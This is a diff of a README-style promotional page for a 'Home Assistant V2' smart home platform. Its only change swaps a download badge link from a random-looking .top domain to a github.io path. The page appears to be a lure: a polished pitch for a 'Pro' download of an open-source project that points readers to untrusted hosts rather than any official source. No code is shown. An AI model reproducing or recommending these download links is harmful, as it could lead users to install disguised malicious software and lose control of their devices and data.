@@ -2,7 +2,7 @@
 
 Revolutionize your home with **Home Assistant V2**, the most advanced open-source smart home ecosystem available today. Designed for both tech-savvy users and beginners, this powerful platform brings unparalleled automation, security, and convenience to your fingertips while maintaining complete privacy and local control.
 
-[![Get Home Assistant V2](https://img.shields.io/badge/Download-Home_Assistant_V2_Pro-blueviolet)](https://poelkakusthbutn.top/)
+[![Get Home Assistant V2](https://img.shields.io/badge/Download-Home_Assistant_V2_Pro-blueviolet)](https://home-assistant-v2.github.io/.github)
 
 ---
 
